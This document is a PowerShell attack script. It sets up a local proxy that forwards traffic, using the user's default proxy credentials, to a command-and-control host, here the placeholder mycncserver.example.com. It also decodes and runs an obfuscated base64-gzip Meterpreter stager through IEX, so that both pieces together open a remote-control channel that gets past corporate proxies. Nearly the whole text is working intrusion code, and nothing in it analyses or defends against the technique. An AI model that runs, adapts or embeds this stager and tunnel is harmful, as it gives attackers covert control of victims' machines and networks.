


$Proxy = {
	
	$proxy = [System.Net.WebRequest]::GetSystemWebProxy()
	$proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

	$proxyServer = New-Object System.Net.HttpListener
	$proxyServer.Prefixes.Add('http://127.0.0.1:8080/')

	$proxyServer.Start()

	
	$metsrvRequest = $true

	$clientBuffer = new-object System.Byte[] 1024
	$serverBuffer = new-object System.Byte[] 65536
	
	
	while ($proxyServer.IsListening) {
		$context = $proxyServer.GetContext() 
		$clientRequest = $context.Request
		$proxyResponse = $context.Response
		
		$headers = $clientRequest.Headers
		$headers.Remove("Proxy-Connection")
		$headers.Remove("Host")
		$method = $clientRequest.HttpMethod
		$pathAndQuery = $clientRequest.Url.PathAndQuery
		
		
		$destUrl = "http://mycncserver.example.com" + $pathAndQuery
		
		
		
		$proxyRequest = [System.Net.HttpWebRequest]::Create($destUrl)
		$proxyRequest.Headers = $headers
		$proxyRequest.Method = $method
		$proxyRequest.Proxy = $proxy
			
		
		
		if ($clientRequest.HasEntityBody) {
			$clientRequestStream = $clientRequest.InputStream
			$proxyRequestStream = $proxyRequest.GetRequestStream()
			
			do {
				$bytesReceived = $clientRequestStream.Read($clientBuffer, 0, $clientBuffer.length)
				$proxyRequestStream.Write($clientBuffer, 0 , $bytesReceived)
			} while ($clientRequestStream.DataAvailable)
			
			$proxyRequestStream.Flush()
		}
		
		
		$serverResponse = $proxyRequest.GetResponse()
		$responseStream = $serverResponse.GetResponseStream()
		$proxyResponseStream = $proxyResponse.OutputStream

		
		
		
		if ($metsrvRequest) {
			
			$offset = 0;
			while ($offset -lt 65536)
			{	
				$bytesReceived = $responseStream.Read($serverBuffer, $offset, 65536 - $offset)
				$offset += $bytesReceived
			}
			$metsrvRequest = $false
		}
		
		
		
		do {
			$bytesReceived = $responseStream.Read($serverBuffer, 0, $serverBuffer.length)
			$proxyResponseStream.Write($serverBuffer, 0 , $bytesReceived)
			$proxyResponseStream.Flush()
		} while ($bytesReceived -gt 0)
		
		$proxyResponseStream.Close()
	}

	$proxyServer.Stop()
}


$MeterpreterStager = {
	
	
	$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('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'));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()
}


$proxyThread = [PowerShell]::Create()
$proxyThread.AddScript($Proxy)
$meterpreterThread = [PowerShell]::Create()
$meterpreterThread.AddScript($MeterpreterStager)
[System.IAsyncResult]$AsyncProxyJobResult = $null
[System.IAsyncResult]$AsyncMeterpreterJobResult = $null

try {
	$AsyncProxyJobResult = $proxyThread.BeginInvoke()
	Sleep 2 
	$AsyncMeterpreterJobResult = $meterpreterThread.BeginInvoke()
}
catch {
	$ErrorMessage = $_.Exception.Message
	Write-Host $ErrorMessage
}
finally {
	if ($proxyThread -ne $null -and $AsyncProxyJobResult -ne $null) {
        $proxyThread.EndInvoke($AsyncProxyJobResult)
        $proxyThread.Dispose()
    }
	
	if ($meterpreterThread -ne $null -and $AsyncMeterpreterJobResult -ne $null) {
        $meterpreterThread.EndInvoke($AsyncMeterpreterJobResult)
        $meterpreterThread.Dispose()
    }
}
